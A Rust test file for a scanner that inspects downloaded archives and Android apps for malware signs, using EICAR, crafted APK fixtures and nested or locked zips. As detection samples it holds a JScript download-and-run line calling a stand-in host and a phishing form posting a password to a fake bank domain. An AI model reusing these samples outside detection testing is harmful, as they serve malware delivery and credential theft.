//! Vigil's deep look (29 Sep 2026, his exam of harmless look-alike malware: 0 of 15 caught before).
//! Every test virus here lives in memory only (look_in_memory): written to the laptop's disk,
//! Defender would take it and the test with it.

use crate::deeplook::{self, eicar, is_test_file, is_weak, look_in_memory, words, Found};
use std::io::Write;

fn no_yara(_: &[u8]) -> Vec<String> {
    Vec::new()
}

fn look(path: &str, b: &[u8]) -> Found {
    look_in_memory(path, b, &no_yara)
}

fn rules(f: &Found) -> Vec<&str> {
    f.hits.iter().map(|h| h.0.as_str()).collect()
}

fn zip_of(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut out = Vec::new();
    {
        let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut out));
        let o = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Deflated);
        for (n, b) in members {
            w.start_file(*n, o).unwrap();
            w.write_all(b).unwrap();
        }
        w.finish().unwrap();
    }
    out
}

fn gz_of(b: &[u8]) -> Vec<u8> {
    let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    e.write_all(b).unwrap();
    e.finish().unwrap()
}

fn tar_of(name: &str, b: &[u8]) -> Vec<u8> {
    let mut t = tar::Builder::new(Vec::new());
    let mut h = tar::Header::new_ustar();
    h.set_size(b.len() as u64);
    h.set_mode(0o644);
    h.set_cksum();
    t.append_data(&mut h, name, b).unwrap();
    t.into_inner().unwrap()
}

fn fixture(name: &str) -> Vec<u8> {
    std::fs::read(std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("tests").join("fixtures").join(name)).unwrap()
}

/// A zip whose one entry carries the "encrypted" flag (bit 0), as a password zip does - set by
/// hand in both headers, since this build's zip library cannot write encrypted entries.
fn locked_zip(name: &str, b: &[u8]) -> Vec<u8> {
    let mut z = zip_of(&[(name, b)]);
    z[6] |= 1; // local file header: general purpose flag
    let cd = z.windows(4).rposition(|w| w == b"PK\x01\x02").unwrap();
    z[cd + 8] |= 1; // central directory entry: the same flag
    z
}

#[test]
fn the_test_file_is_caught_plain_and_renamed() {
    assert_eq!(rules(&look("Download/eicar.com", &eicar())), ["TestFile"]);
    assert_eq!(rules(&look("Download/holiday_photo.jpg", &eicar())), ["TestFile"], "a new name changes nothing");
    let mut spaced = eicar();
    spaced.extend_from_slice(b"\r\n  ");
    assert!(is_test_file(&spaced), "the standard allows trailing whitespace");
}

#[test]
fn only_the_real_test_file_counts() {
    let mut junk = eicar();
    junk.push(b'X');
    assert!(!is_test_file(&junk), "anything but whitespace after it: not the test file");
    assert!(!is_test_file(&eicar()[..60]), "a cut-off start is not it");
    let mut late = b"hello ".to_vec();
    late.extend(eicar());
    assert!(!is_test_file(&late), "it must be at the start");
    let mut long = eicar();
    long.extend(vec![b' '; 61]);
    assert!(!is_test_file(&long), "over 128 bytes is not it");
}

#[test]
fn archives_are_opened_however_deep_or_wrapped() {
    let z = zip_of(&[("eicar.com", &eicar())]);
    let f = look("Download/eicar.zip", &z);
    assert!(rules(&f).contains(&"TestFileInside"), "{:?}", rules(&f));
    assert!(rules(&f).contains(&"Shape_archive-single-program") && is_weak("Shape_archive-single-program") == Some(true),
            "a zip of one program: said, but only worth a look (honest downloads come like that)");
    let deep = zip_of(&[("old.zip", &zip_of(&[("inner.zip", &zip_of(&[("readme.com", &eicar())]))]))]);
    let f = look("Download/backup.zip", &deep);
    let at = f.hits.iter().find(|h| h.0 == "TestFileInside").map(|h| h.1.as_str());
    assert_eq!(at, Some("backup.zip > old.zip > inner.zip > readme.com"), "the page says where inside");
    assert!(rules(&look("Download/logs.tar.gz", &gz_of(&tar_of("logs/eicar.com", &eicar())))).contains(&"TestFileInside"));
    assert_eq!(rules(&look("Download/one.gz", &gz_of(&eicar()))), ["TestFileInside"]);
    let apk = fixture("vv-plain.apk");
    let mut app = std::io::Cursor::new(apk);
    {
        let mut w = zip::ZipWriter::new_append(&mut app).unwrap();
        w.start_file("assets/payload.bin", zip::write::SimpleFileOptions::default()).unwrap();
        w.write_all(&eicar()).unwrap();
        w.finish().unwrap();
    }
    assert!(rules(&look("Download/game_mod.apk", app.get_ref())).contains(&"TestFileInside"), "inside an app's own files");
}

#[test]
fn too_deep_is_said_not_passed() {
    let mut b = eicar();
    for i in 0..7 {
        b = zip_of(&[(&format!("level{i}.zip"), &b)]);
    }
    let r = look("Download/russian_doll.zip", &b);
    assert_eq!(rules(&r), ["ArchiveTooDeep"], "stopped at 5 levels, and said so");
}

#[test]
fn a_password_zip_is_named_as_locked() {
    let r = look("Download/locked.zip", &locked_zip("eicar.com", &eicar()));
    assert!(rules(&r).contains(&"ArchiveLocked"), "{:?}", rules(&r));
    assert!(!rules(&r).contains(&"TestFileInside"), "it cannot be read, so it must not claim to have read it");
    assert!(r.hits.iter().all(|h| is_weak(&h.0) == Some(true)), "{:?}", rules(&r));
    assert_eq!(is_weak("ArchiveLocked"), Some(true), "his own locked zips exist: worth a look, never harmful");
}

#[test]
fn what_an_app_asks_for_decides() {
    let stealer = fixture("vv-hidden-stealer.apk");
    assert_eq!(rules(&look("Download/WhatsApp_Update.apk", &stealer)), ["AppHidesAndSteals"]);
    assert_eq!(is_weak("AppHidesAndSteals"), Some(false));
    // The same asks with an icon: automation apps (Tasker, MacroDroid) look like this.
    assert_eq!(rules(&look("Download/automate.apk", &fixture("vv-visible-sms.apk"))), ["AppBankerShape"]);
    assert_eq!(is_weak("AppBankerShape"), Some(true));
    assert!(look("Download/plain.apk", &fixture("vv-plain.apk")).hits.is_empty(), "an ordinary app: nothing");
}

#[test]
fn a_dressed_up_app_is_caught() {
    let stealer = fixture("vv-hidden-stealer.apk");
    let r = rules(&look("Download/Invoice_2026.pdf", &stealer)).into_iter().map(String::from).collect::<Vec<_>>();
    assert!(r.contains(&"AppDisguised".into()) && r.contains(&"AppHidesAndSteals".into()), "{r:?}");
    let plain_as_pdf = look("Download/notes.pdf", &fixture("vv-plain.apk"));
    assert_eq!(rules(&plain_as_pdf), ["AppDisguised"], "an ordinary app named .pdf is still a trick");
    // 29 Sep: Android's build tools write resources-debug.ap_ - an app package by its own name.
    assert!(rules(&look("build/intermediates/resources-debug.ap_", &fixture("vv-plain.apk"))).is_empty(), "a build tool's .ap_ is not a disguise");
    let inzip = look("Download/photos.zip", &zip_of(&[("IMG_2041.jpg.apk", &stealer)]));
    let r = rules(&inzip);
    assert!(r.contains(&"AppInArchiveDisguised") && r.contains(&"AppHidesAndSteals"), "{r:?}");
}

#[test]
fn an_app_sent_by_chat_is_worth_a_look() {
    let wa = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents/SBI_KYC_update.apk";
    assert_eq!(rules(&look(wa, &fixture("vv-plain.apk"))), ["AppFromChat"]);
    assert_eq!(is_weak("AppFromChat"), Some(true));
    assert!(look("/storage/emulated/0/Download/plain.apk", &fixture("vv-plain.apk")).hits.is_empty());
}

#[test]
fn the_shape_checks_now_run_in_the_sweep() {
    let pe = [b"MZ".as_slice(), &[0u8; 300]].concat();
    let f = look("Download/invoice.pdf.exe", &pe);
    let r = rules(&f);
    assert!(r.contains(&"Shape_double-ending"), "{r:?}");
    assert_eq!(is_weak("Shape_double-ending"), Some(false), "a name trick is harmful");
    let js = b"var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET','http://a.invalid/a.exe');var s=new ActiveXObject('WScript.Shell');s.Run('a.exe');";
    assert!(rules(&look("Download/update.js", js)).contains(&"Shape_download-and-run"));
    assert_eq!(is_weak("Shape_download-and-run"), Some(true), "his own install scripts look like this: worth a look");
    let page = b"<html><form action='http://sbi-kyc.invalid/c.php' method=post><input type=password name=p></form></html>";
    assert_eq!(rules(&look("Download/Payment_Details.html", page)), ["PasswordFormElsewhere"]);
    let docm = zip_of(&[("word/document.xml", b"<w:document/>"), ("word/vbaProject.bin", b"x")]);
    assert_eq!(rules(&look("Download/Salary.docm", &docm)), ["MacroDocument"]);
}

#[test]
fn ordinary_files_stay_quiet() {
    assert!(look("Download/notes.txt", b"milk, eggs\n").hits.is_empty());
    assert!(look("Download/a.zip", &zip_of(&[("a.txt", b"hello\n")])).hits.is_empty());
    let page = b"<html><form action='https://example.com/search'><input name=q></form></html>";
    assert!(look("Download/saved.html", page).hits.is_empty(), "a form with no password box");
    let local = b"<html><form action='/login'><input type=password></form></html>";
    assert!(look("Download/saved2.html", local).hits.is_empty(), "a password box that posts nowhere outside");
    // Real apps from the manifest-reader fixtures (F-Droid client; his Sound app).
    for real in ["fdroid.apk", "sound.apk", "sound-obfuscated.apk"] {
        let f = look(&format!("Download/{real}"), &fixture(real));
        assert!(f.hits.is_empty(), "{real}: {:?}", rules(&f));
    }
}

#[test]
fn files_inside_are_fingerprinted_and_pattern_read() {
    let z = zip_of(&[("a.bin", b"one"), ("b.bin", b"two")]);
    let seen = std::sync::Mutex::new(0);
    let f = look_in_memory("Download/x.zip", &z, &|b: &[u8]| {
        *seen.lock().unwrap() += 1;
        if b == b"two" { vec!["YARAhub/Fake_Rule".into()] } else { vec![] }
    });
    assert_eq!(*seen.lock().unwrap(), 2, "each inner file goes past the pattern rules");
    assert_eq!(f.member_rules, ["YARAhub/Fake_Rule"]);
    assert_eq!(f.member_shas.len(), 2, "each inner file's fingerprint goes to the known-malware list");
    assert_eq!(f.member_shas[0], "7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed", "sha256 of 'one'");
}

// ---- 29 Sep: tests for the five mutants that survived the first run (each one below is RED
// against the change named in its comment).

/// The cap is exactly 5 archives deep: a 6th-level archive is not opened (mutant `>` for `>=`).
#[test]
fn the_depth_cap_is_exactly_five() {
    let wrap = |n: usize| {
        let mut b = eicar();
        for i in 0..n {
            b = zip_of(&[(&format!("level{i}.zip"), &b)]);
        }
        b
    };
    assert_eq!(rules(&look("Download/five.zip", &wrap(5))), ["TestFileInside"], "5 archives: all opened, the test file found");
    assert_eq!(rules(&look("Download/six.zip", &wrap(6))), ["ArchiveTooDeep"], "6: the 6th is not opened, and that is said");
}

/// "No icon" is what makes a quiet ask a sign (mutant: the launcher check dropped).
#[test]
fn a_hidden_app_needs_no_icon_and_an_sms_app_with_one_is_quiet() {
    assert_eq!(rules(&look("Download/sms_helper.apk", &fixture("vv-hidden-sms.apk"))), ["AppHidden"]);
    assert_eq!(is_weak("AppHidden"), Some(true));
    let f = look("Download/messages.apk", &fixture("vv-visible-smsonly.apk"));
    assert!(f.hits.is_empty(), "an SMS app with an icon and no screen control is ordinary: {:?}", rules(&f));
}

/// An app file with a "locked" inner file. Android ignores the flag, but analysis tools stop at it,
/// so malware sets it on purpose. The shape checks skip app files, so only the deep look says it
/// (mutant: the encrypted-entry branch removed).
#[test]
fn a_locked_file_inside_an_app_is_said() {
    let apk = fixture("vv-plain.apk");
    let mut app = std::io::Cursor::new(apk);
    {
        let mut w = zip::ZipWriter::new_append(&mut app).unwrap();
        w.start_file("assets/x.bin", zip::write::SimpleFileOptions::default()).unwrap();
        w.write_all(b"payload").unwrap();
        w.finish().unwrap();
    }
    let mut z = app.into_inner();
    let lh = z.windows(4).rposition(|w| w == b"PK\x03\x04").unwrap();
    z[lh + 6] |= 1;
    let cd = z.windows(4).rposition(|w| w == b"PK\x01\x02").unwrap();
    z[cd + 8] |= 1;
    assert_eq!(rules(&look("Download/app.apk", &z)), ["ArchiveLocked"]);
}

/// At most MAX_MEMBERS inner files are read (mutant: the loop's budget check removed).
#[test]
fn a_zip_with_too_many_files_stops_at_the_cap() {
    let names: Vec<String> = (0..20_050).map(|i| format!("f{i}.txt")).collect();
    let bodies: Vec<Vec<u8>> = (0..20_050).map(|i| format!("{i}").into_bytes()).collect();
    let members: Vec<(&str, &[u8])> = names.iter().zip(&bodies).map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    let z = zip_of(&members);
    let seen = std::sync::atomic::AtomicUsize::new(0);
    let f = look_in_memory("Download/many.zip", &z, &|_: &[u8]| {
        seen.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        vec![]
    });
    assert_eq!(seen.load(std::sync::atomic::Ordering::Relaxed), 20_000);
    assert_eq!(f.member_shas.len(), 20_000);
    assert!(rules(&f).contains(&"ArchiveNotFullyOpened"), "the 50 unread files are SAID (29 Sep): {:?}", rules(&f));
}

#[test]
fn every_vigil_rule_has_a_strength_and_words() {
    for (r, weak, w) in deeplook::RULES {
        assert_eq!(is_weak(r), Some(*weak));
        assert_eq!(crate::yara::weak_rule("Vigil", r), *weak, "the sweep reads strength through weak_rule");
        assert!(w.len() > 40 && words(r) == *w);
    }
    assert!(!crate::yara::weak_rule("Vigil", "Shape_disguised-program"));
    assert!(crate::yara::weak_rule("Vigil", "Shape_shortcut-runs-command"));
    assert!(!crate::yara::weak_rule("Vigil", "NoSuchRule"), "unknown: never quieter");
}

// ---- 29 Sep evening: the 7 hard gaps (his "Improve all these faults as much as you can").
// Each new rule fires on its case and its nearest ordinary neighbour stays quiet.

/// vv-plain.apk with extra inner files added.
fn app_with(extra: &[(&str, &[u8])]) -> Vec<u8> {
    let mut app = std::io::Cursor::new(fixture("vv-plain.apk"));
    {
        let mut w = zip::ZipWriter::new_append(&mut app).unwrap();
        for (n, b) in extra {
            w.start_file(*n, zip::write::SimpleFileOptions::default()).unwrap();
            w.write_all(b).unwrap();
        }
        w.finish().unwrap();
    }
    app.into_inner()
}

/// Droppers: the power to install other apps is what the FILE shows before the real malware comes.
#[test]
fn a_dropper_is_seen_by_its_power_to_install() {
    assert_eq!(rules(&look("Download/update.apk", &fixture("vv-hidden-installer.apk"))), ["AppHidden", "AppHiddenInstaller"]);
    assert_eq!(rules(&look("Download/cleaner.apk", &fixture("vv-visible-dropper.apk"))), ["AppDropperShape"]);
    assert_eq!(rules(&look("Download/service.apk", &fixture("vv-hidden-caninstall.apk"))), ["AppHiddenCanInstall"]);
    let store = look("Download/store.apk", &fixture("vv-visible-caninstall.apk"));
    assert!(store.hits.is_empty(), "an app store with an icon can install apps and is ordinary: {:?}", rules(&store));
    assert_eq!(is_weak("AppHiddenInstaller"), Some(false));
    assert_eq!(is_weak("AppDropperShape"), Some(true));
    assert_eq!(is_weak("AppHiddenCanInstall"), Some(true));
}

/// The placeholder app with its package swapped, in memory, for `to` (same length) - so no listed
/// stalkerware package name is ever stored on this disk for the laptop sweep to read.
fn with_package(apk: &[u8], from: &str, to: &str) -> Vec<u8> {
    assert_eq!(from.len(), to.len());
    let mut z = zip::ZipArchive::new(std::io::Cursor::new(apk.to_vec())).unwrap();
    let mut out = std::io::Cursor::new(Vec::new());
    {
        let mut w = zip::ZipWriter::new(&mut out);
        for i in 0..z.len() {
            let mut e = z.by_index(i).unwrap();
            let n = e.name().to_string();
            let mut b = Vec::new();
            std::io::Read::read_to_end(&mut e, &mut b).unwrap();
            if n == "AndroidManifest.xml" {
                let wide = |s: &str| s.encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>();
                let pairs = [(from.as_bytes().to_vec(), to.as_bytes().to_vec()), (wide(from), wide(to))];
                let mut done = 0;
                for (f, t) in &pairs {
                    while let Some(p) = b.windows(f.len()).position(|x| x == f.as_slice()) {
                        b[p..p + f.len()].copy_from_slice(t);
                        done += 1;
                    }
                }
                assert!(done > 0, "placeholder not found in the manifest");
                assert_eq!(crate::axml::parse(&b).and_then(|m| m.package).as_deref(), Some(to), "the swap must really rename it");
            }
            w.start_file(n, zip::write::SimpleFileOptions::default()).unwrap();
            w.write_all(&b).unwrap();
        }
        w.finish().unwrap();
    }
    out.into_inner()
}

/// A stalkerware app FILE (waiting in Download or a chat folder) is named by its package, from the
/// list the app ships (read OUT of the built list, never typed here).
#[test]
fn a_stalkerware_app_file_is_named_by_its_package() {
    let ph = "com.vvtest.placeholdr";
    let mut same_len: Vec<(&String, &String)> = crate::stalker::LIST.packages.iter().filter(|(p, _)| p.len() == ph.len()).collect();
    same_len.sort();
    let (pkg, app) = same_len[0];
    let f = look("Download/Wi-Fi_Service.apk", &with_package(&fixture("vv-stalker-placeholder.apk"), ph, pkg));
    assert_eq!(f.hits, [("AppStalkerware".to_string(), format!("Wi-Fi_Service.apk ({app})"))]);
    assert_eq!(is_weak("AppStalkerware"), Some(false));
    let quiet = look("Download/Wi-Fi_Service.apk", &fixture("vv-stalker-placeholder.apk"));
    assert!(quiet.hits.is_empty(), "an unlisted package: nothing: {:?}", rules(&quiet));
}

/// ... and by its maker's signing key, read out of the FILE (v2 block and v1 signature both).
/// No listed maker's key can sign a fixture, so the test names its own throwaway key (TEST_CERT).
#[test]
fn a_stalkerware_app_file_is_named_by_its_signing_key() {
    let key = String::from_utf8(fixture("vv-signed.sha1.txt")).unwrap().trim().to_string();
    crate::stalker::TEST_CERT.with(|t| *t.borrow_mut() = Some(key));
    let v2 = look("Download/sys.apk", &fixture("vv-signed-v2.apk"));
    let v1 = look("Download/sys.apk", &fixture("vv-signed-v1.apk"));
    let unsigned = look("Download/sys.apk", &fixture("vv-plain.apk"));
    crate::stalker::TEST_CERT.with(|t| *t.borrow_mut() = None);
    assert_eq!(rules(&v2), ["AppStalkerware"]);
    assert_eq!(rules(&v1), ["AppStalkerware"]);
    assert!(unsigned.hits.is_empty(), "{:?}", rules(&unsigned));
    // The real list: a listed key finds its app, in either letter case.
    let l = &crate::stalker::LIST;
    let mut keys: Vec<(&String, &String)> = l.certs.iter().collect();
    keys.sort();
    let (c, app) = keys[0];
    assert_eq!(crate::stalker::app_for(None, &[c.to_lowercase()]).as_deref(), Some(app.as_str()));
    assert_eq!(crate::stalker::app_for(Some("com.example.plain"), &[]), None);
    assert!(l.packages.len() > 500 && l.certs.len() > 400 && l.samples.len() > 3000, "the whole list ships");
}

/// Every protector name says where it came from, and the APKiD-only ones cannot quietly grow
/// (29 Sep 2026: the list was re-sourced from MIT / Apache / published sources).
#[test]
fn every_protector_name_has_a_source_and_apkid_only_names_are_capped() {
    const KNOWN: [&str; 7] = ["die", "lcr", "mhook", "vb2014", "caro2014", "blog", "apkid-fact"];
    let mut seen = std::collections::HashSet::new();
    for (n, label, src) in crate::deeplook::packer_list() {
        assert!(KNOWN.contains(src), "{n}: unknown source {src}");
        assert!(!label.is_empty(), "{n}: no protector name");
        assert_eq!(*n, n.to_lowercase(), "{n}: names are matched lower-cased");
        assert!(seen.insert(*n), "{n}: listed twice");
    }
    let apkid = crate::deeplook::packer_list().iter().filter(|p| p.2 == "apkid-fact").count();
    assert_eq!(apkid, 0, "{apkid} APKiD-only names - dropped for the public release (3 Nov 2026); find another source before adding one");
    assert!(crate::deeplook::packer_list().len() >= 112, "the list must not shrink by accident (112 after the 11 APKiD names were dropped, 3 Nov 2026)");
}

/// App protectors are named from the inner file names they leave.
#[test]
fn a_protected_app_is_named_by_its_protector() {
    let f = look("Download/bank.apk", &app_with(&[("lib/arm64-v8a/libjiagu.so", b"lib")]));
    assert_eq!(f.hits, [("AppPacked".to_string(), "bank.apk > lib/arm64-v8a/libjiagu.so (Qihoo 360 Jiagu)".to_string())]);
    assert_eq!(rules(&look("Download/a.apk", &app_with(&[("assets/ijm_lib/x.so", b"lib")]))), ["AppPacked"], "a folder-start name");
    assert_eq!(rules(&look("Download/a.apk", &app_with(&[("mix.dex", b"dex")]))), ["AppPacked"], "a bare file name at the top");
    assert!(look("Download/a.apk", &app_with(&[("lib/arm64-v8a/libgame.so", b"lib")])).hits.is_empty(), "an ordinary library");
    assert!(look("Download/a.apk", &app_with(&[("lib/arm64-v8a/xlibjiagu.so", b"lib")])).hits.is_empty(), "the whole file name must match");
    assert!(look("Download/a.apk", &app_with(&[("assets/notijm_lib/x.so", b"lib")])).hits.is_empty(), "a folder name must START the path");
    assert!(look("Download/a.apk", &app_with(&[("lib/assets/ijm_lib/x.so", b"lib")])).hits.is_empty(), "the folder only counts at the app's top (mutant: starts_with -> contains)");
    assert!(look("Download/libs.zip", &zip_of(&[("libjiagu.so", b"lib")])).hits.is_empty(), "only inside an app");
    assert_eq!(is_weak("AppPacked"), Some(true), "banks use protectors too");
}

fn aes_zip(members: &[(&str, &[u8])], pw: &str) -> Vec<u8> {
    let mut out = Vec::new();
    {
        let mut w = zip::ZipWriter::new(std::io::Cursor::new(&mut out));
        let o = zip::write::SimpleFileOptions::default().with_aes_encryption(zip::AesMode::Aes256, pw);
        for (n, b) in members {
            w.start_file(*n, o).unwrap();
            w.write_all(b).unwrap();
        }
        w.finish().unwrap();
    }
    out
}

/// A locked zip with a guessable password is opened and looked inside; a strong password stays
/// "locked", and never claims to have read what it could not. AES zips are made here in memory
/// (the test file inside); old ZipCrypto zips were made by 7-Zip, holding a harmless marker
/// (vv-zipcrypto-*.zip: note.txt "hello" + marker.txt "marker", passwords 4471 / doc-9981 /
/// T7#kq!vB02; `7z a -tzip -mem=ZipCrypto -mx=0 -p<pw>`), as this zip library cannot write them.
#[test]
fn a_zip_locked_with_a_guessable_password_is_opened() {
    let e = eicar();
    let two: [(&str, &[u8]); 2] = [("note.txt", b"hello"), ("eicar.com", &e)];
    for (what, pw, name) in [
        ("the industry's 'infected'", "infected", "Download/sample.zip"),
        ("a word from its name, lower-cased", "slip", "Download/Salary-SLIP.zip"),
        ("its whole name", "doc-9981", "Download/doc-9981.zip"),
    ] {
        let f = look(name, &aes_zip(&two, pw));
        let r = rules(&f);
        assert!(r.contains(&"ArchiveOpenedWithCommonPassword"), "{what}: {r:?}");
        assert!(r.contains(&"TestFileInside"), "{what}: the SECOND locked file was read with the found password: {r:?}");
        assert!(!r.contains(&"ArchiveLocked"), "{what}: it was opened, so 'locked, not looked inside' would be false: {r:?}");
    }
    let strong = look("Download/sample.zip", &aes_zip(&two, "T7#kq!vB02"));
    assert_eq!(rules(&strong), ["ArchiveLocked"], "a strong password: locked, nothing read");
    // ZipCrypto, from 7-Zip: both inner files read (the marker one is found by the pattern rules).
    for (fx, name) in [("vv-zipcrypto-4471.zip", "Download/Invoice_pw_4471.zip"), ("vv-zipcrypto-doc-9981.zip", "Download/doc-9981.zip")] {
        let seen = std::sync::Mutex::new(Vec::<Vec<u8>>::new());
        let f = look_in_memory(name, &fixture(fx), &|b: &[u8]| {
            seen.lock().unwrap().push(b.to_vec());
            if b == b"marker" { vec!["Test/Marker".into()] } else { vec![] }
        });
        assert_eq!(rules(&f), ["ArchiveOpenedWithCommonPassword"], "{fx}");
        assert_eq!(f.member_rules, ["Test/Marker"], "{fx}");
        let mut s = seen.into_inner().unwrap();
        s.sort();
        assert_eq!(s, [b"hello".to_vec(), b"marker".to_vec()], "{fx}: both files, decrypted right");
    }
    let f = look_in_memory("Download/sample.zip", &fixture("vv-zipcrypto-strong.zip"), &|_: &[u8]| vec![]);
    assert_eq!(rules(&f), ["ArchiveLocked"]);
    assert!(f.member_shas.is_empty(), "nothing was read, so nothing fingerprinted");
    assert_eq!(is_weak("ArchiveOpenedWithCommonPassword"), Some(true));
}

/// A simple random-looking filler (does not compress, so a gzip of it stays big).
fn noise(n: usize) -> Vec<u8> {
    let mut x: u64 = 0x9e37_79b9_7f4a_7c15;
    (0..n).map(|_| { x ^= x << 13; x ^= x >> 7; x ^= x << 17; x as u8 }).collect()
}

fn tar_many(members: &[(&str, &[u8])]) -> Vec<u8> {
    let mut t = tar::Builder::new(Vec::new());
    for (n, b) in members {
        let mut h = tar::Header::new_ustar();
        h.set_size(b.len() as u64);
        h.set_mode(0o644);
        h.set_cksum();
        t.append_data(&mut h, *n, *b).unwrap();
    }
    t.into_inner().unwrap()
}

/// Every cap is SAID as ArchiveNotFullyOpened, never silent; a small archive does not say it.
#[test]
fn what_is_left_unread_is_said() {
    const MB: usize = 1 << 20;
    let small = look("Download/x.zip", &zip_of(&[("a.txt", b"one"), ("b.txt", b"two")]));
    assert!(small.hits.is_empty(), "{:?}", rules(&small));
    // One inner file over 32 MB: not read, and said - but not in an app, where it is media.
    let big = vec![0u8; 33 * MB];
    assert_eq!(rules(&look("Download/backup.zip", &zip_of(&[("holiday.mp4", &big)]))), ["ArchiveNotFullyOpened"]);
    assert!(look("Download/game.apk", &app_with(&[("assets/video.bin", &big)])).hits.is_empty(), "an app's big media file");
    drop(big);
    // Over 128 MB unpacked: the LAST file cut short must be said too.
    let part = vec![0u8; 30 * MB];
    let z = zip_of(&[("1.bin", &part), ("2.bin", &part), ("3.bin", &part), ("4.bin", &part), ("5.bin", &part)]);
    drop(part);
    assert_eq!(rules(&look("Download/parts.zip", &z)), ["ArchiveNotFullyOpened"]);
    drop(z);
    // A gzip that unpacks past its room.
    assert_eq!(rules(&look("Download/dump.gz", &gz_of(&vec![0u8; 33 * MB]))), ["ArchiveNotFullyOpened"]);
    // A tar whose files add up past 128 MB stays inside the room (it used to read on regardless,
    // and a gzip after that crashed on the subtraction) - and says so.
    let chunk = vec![0u8; 31 * MB];
    let last = gz_of(&noise(8 * MB));
    let tarb = tar_many(&[("0.bin", &chunk), ("1.bin", &chunk), ("2.bin", &chunk), ("3.bin", &chunk), ("last.gz", &last)]);
    drop(chunk);
    let seen = std::sync::atomic::AtomicUsize::new(0);
    let f = look_in_memory("Download/logs.tar", &tarb, &|b: &[u8]| {
        seen.fetch_add(b.len(), std::sync::atomic::Ordering::Relaxed);
        vec![]
    });
    // Each read byte reaches the pattern rules once per level: the tar's files, plus what the
    // cut-off gzip unpacked (nothing, as no room is left).
    assert!(seen.load(std::sync::atomic::Ordering::Relaxed) <= 128 * MB, "read past the 128 MB room");
    assert!(rules(&f).contains(&"ArchiveNotFullyOpened"), "{:?}", rules(&f));
    assert_eq!(is_weak("ArchiveNotFullyOpened"), Some(true));
}

/// A file over 32 MB on disk is walked straight from the file (it used to be manifest-only), and
/// what it could not read is said. Harmless content only - these ARE written to disk.
#[test]
fn a_big_archive_on_disk_is_opened_from_the_file() {
    const MB: usize = 1 << 20;
    let d = crate::testdir::TestDir::new("deeplook-big");
    let marker = |b: &[u8]| if b == b"marker" { vec!["Test/Marker".to_string()] } else { vec![] };
    let big = vec![0u8; 33 * MB];
    // zip, stored, so the file itself is over 32 MB.
    let zp = d.path().join("backup.zip");
    {
        let mut w = zip::ZipWriter::new(std::fs::File::create(&zp).unwrap());
        let o = zip::write::SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
        w.start_file("marker.txt", o).unwrap();
        w.write_all(b"marker").unwrap();
        w.start_file("disk.img", o).unwrap();
        w.write_all(&big).unwrap();
        w.finish().unwrap();
    }
    let f = deeplook::look(&zp, &marker);
    assert_eq!(f.member_rules, ["Test/Marker"], "the inner file was read from the big zip");
    assert_eq!(rules(&f), ["ArchiveNotFullyOpened"], "and the 33 MB inner file was said");
    // tar
    let tp = d.path().join("logs.tar");
    std::fs::write(&tp, tar_many(&[("marker.txt", b"marker"), ("disk.img", &big)])).unwrap();
    let f = deeplook::look(&tp, &marker);
    assert_eq!(f.member_rules, ["Test/Marker"]);
    assert_eq!(rules(&f), ["ArchiveNotFullyOpened"]);
    drop(big);
    // gzip of noise, so the .gz itself is over 32 MB; it unpacks past the room.
    let gp = d.path().join("dump.gz");
    std::fs::write(&gp, gz_of(&noise(33 * MB))).unwrap();
    assert!(std::fs::metadata(&gp).unwrap().len() > 32 * MB as u64);
    assert_eq!(rules(&deeplook::look(&gp, &marker)), ["ArchiveNotFullyOpened"]);
    // A small archive written to disk takes the ordinary path and says nothing.
    let sp = d.path().join("small.zip");
    std::fs::write(&sp, zip_of(&[("marker.txt", b"marker")])).unwrap();
    let f = deeplook::look(&sp, &marker);
    assert!(f.hits.is_empty() && f.member_rules == ["Test/Marker"], "{:?}", rules(&f));
}
